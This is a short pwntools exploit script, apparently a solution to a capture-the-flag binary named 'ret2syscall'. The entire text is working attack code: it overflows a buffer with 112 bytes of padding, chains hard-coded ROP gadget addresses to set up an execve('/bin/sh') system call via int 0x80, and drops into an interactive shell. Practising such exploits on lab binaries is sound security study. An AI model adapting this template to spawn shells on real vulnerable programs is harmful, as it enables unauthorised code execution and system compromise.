from pwn import *
context.log_level = "debug"
io = process("./ret2syscall")
elf = ELF("./ret2syscall")
binsh = next(elf.search(b"/bin/sh"))
popeax = 0x80bb196
popecxebx = 0x806eb91
popedx = 0x806eb6a
int80 = 0x8049421

io.recv()
payload = b"A"*112 + p32(popeax)+p32(0xb)+p32(popecxebx)+p32(0)+p32(binsh)+p32(popedx)+p32(0)+p32(int80)
io.sendline(payload)
io.interactive()
